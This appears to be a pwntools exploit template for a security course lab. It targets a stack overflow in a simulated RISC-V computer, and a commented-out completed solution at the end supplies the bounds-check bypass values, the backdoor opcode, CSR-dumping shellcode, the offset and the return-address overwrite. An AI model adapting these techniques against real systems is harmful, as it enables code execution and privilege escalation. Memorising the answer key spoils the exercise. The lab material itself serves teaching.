from pwn import *

# ============================================================================
# Find the offset of return address - Step 1
# ============================================================================
# Uncomment this section to find the offset using cyclic pattern
# 
# p = process(['./obj_dir/VComputer', 'build/part3/main.mem'])

# # First, bypass the bounds check (use values from Step 1)
# p.recvuntil(b'Enter number of data: ')
# p.sendline(b'???')  # TODO: enter the value that triggers the bug

# p.recvuntil(b'Enter length of each data: ')
# p.sendline(b'???')  # TODO: enter the other value

# p.recvuntil(b'Enter your data')

# # Send a cyclic pattern to find where the return address is
# # cyclic(n) generates a De Bruijn sequence of length n
# payload = cyclic(200)
# p.sendline(payload)

# p.interactive()

# ============================================================================
# Find the offset of return address - Step 2
# ============================================================================

# After running script in Step 2.1, the program will crash or behave unexpectedly.
# Check the output to find which part of the cyclic pattern overwrote the return address.
#
# For example, if the first exception message is "[EXCEPTION!] mcause=2 mepc=12345678 mpp=0 (U-mode)"
# Then "0x12345678" is the pattern that overwrote the return address
#
# Comment out all other code and use the following two lines of code to get the offset:
# offset = cyclic_find(0x12345678)  # TODO: Replace with actual value
# print(f"Offset of return address: {offset}")



# ============================================================================
# Helper function that builds the shellcode
# ============================================================================
def make_shellcode():
    """
    Construct shellcode that:
    1. Executes backdoor to escalate to M-mode
    2. Reads CSRs 0xFC0-0xFC7 and outputs via serial
    3. Ends with infinite loop
    """
    sc = b''
    
    # --------------------------------------------------
    # 1. Backdoor instruction: escalate to M-mode
    #    Use the opcode you found in Part 2
    #    Hint: The instruction encoding is 0x000000XX where XX is your opcode
    # --------------------------------------------------
    sc += p32(0x00000000) # TODO: Replace with actual value
    
    # --------------------------------------------------
    # 2. Read and output CSRs 0xFC0 through 0xFC7
    #    For each CSR:
    #      a) csrr a0, <csr>   - read CSR into a0
    #      b) csrw 0x004, a0   - write a0 to serial output
    #
    #    Encoding for csrr a0, csr:
    #      (csr << 20) | (0b010 << 12) | (10 << 7) | 0b1110011
    #      where 10 is the register number for a0
    #
    #    Encoding for csrw 0x004, a0:
    #      0x00451073
    # --------------------------------------------------
    for csr_addr in range(0xFC0, 0xFC8):
        # TODO: Calculate csrr instruction encoding
        # csrr_inst = ???
        # sc += p32(csrr_inst)
        
        # Output to serial
        sc += p32(0x00451073)  # csrw 0x004, a0
    
    # --------------------------------------------------
    # 3. Infinite loop to prevent crash
    #    jal x0, 0  =>  keeps jumping to itself
    # --------------------------------------------------
    sc += p32(0x0000006F)
    
    return sc


# ============================================================================
# Main function, complete this after you find the offset of return address 
# ============================================================================
def main():
    p = process(['./obj_dir/VComputer', 'build/part3/main.mem'])
    
    # --------------------------------------------------
    # Parse buffer address from program output
    # The program prints: "inputbuf is at 0x????????"
    # --------------------------------------------------
    p.recvuntil(b'inputbuf is at 0x')
    buf_addr = int(p.recvline().strip(), 16)
    print(f"[*] Buffer address: {hex(buf_addr)}")
    

    # Send values to bypass bounds check
    p.recvuntil(b'Enter number of data: ')
    # TODO: p.sendline(b'???')
    
    p.recvuntil(b'Enter length of each data: ')
    # TODO: p.sendline(b'???')
    
    p.recvuntil(b'Enter your data')
    
    # --------------------------------------------------
    # Construct payload
    # Layout: [shellcode] + [padding] + [return address]
    # --------------------------------------------------
    shellcode = make_shellcode()
    # offset = ???  # TODO: Use the offset found in Step 2
    
    payload = b''
    # TODO: Build the payload
    # payload += shellcode
    # payload += ???  # padding to fill the gap
    # payload += ???  # return address (use p32() to pack the address)
    
    p.sendline(payload)
    
    p.interactive()


if __name__ == '__main__':
    main()















































# from pwn import *

# # ----------------------------- find the offset of ra -----------------------------

# # p = process(['./obj_dir/VComputer', 'testing2/test_c_simple.mem'])

# # # Bypass bounds check
# # p.recvuntil(b'Enter number of data: ')
# # p.sendline(b'17')

# # p.recvuntil(b'Enter length of each data: ')
# # p.sendline(b'10')

# # p.recvuntil(b'Enter your data')

# # # use cyclic to find the offset of return address
# # payload = cyclic(170)
# # p.sendline(payload)

# # p.interactive()

# # ----------------------------- find the offset of ra -----------------------------

# from pwn import *

# def make_shellcode():
#     sc = b''
    
#     # 1. backdoor
#     sc += p32(0x0000007b)
    
#     # 2. read and print CSR 0xFC0 - 0xFC7
#     for csr_addr in range(0xFC0, 0xFC8):
#         # csrr a0, csr_addr
#         csrr_inst = (csr_addr << 20) | (0b010 << 12) | (0b01010 << 7) | 0b1110011
#         sc += p32(csrr_inst)
        
#         # csrw 0x004, a0
#         sc += p32(0x00451073)
    
#     # newline
#     sc += p32(0x00A00513)  # li a0, '\n'
#     sc += p32(0x00451073)  # csrw 0x004, a0
    
#     # 4. Infinite loop
#     sc += p32(0x0000006F)  # jal x0, 0
    
#     return sc

# def main():
#     p = process(['./obj_dir/VComputer', 'build/part3/main.mem'])
    
#     p.recvuntil(b'inputbuf is at 0x')
#     buf_addr = int(p.recvline().strip(), 16)
#     # print(f"[*] Buffer at: {hex(buf_addr)}")
    
#     p.recvuntil(b'Enter number of data: ')
#     p.sendline(b'17')
    
#     p.recvuntil(b'Enter length of each data: ')
#     p.sendline(b'10')
    
#     p.recvuntil(b'Enter your data')
    
#     shellcode = make_shellcode()
#     offset = 128
    
#     payload = shellcode
#     payload += b'A' * (offset - len(shellcode))
#     payload += p32(buf_addr)
    
#     # print(f"[*] Shellcode: {len(shellcode)} bytes")
    
#     p.sendline(payload)
    
#     p.interactive()

# if __name__ == '__main__':
#     main()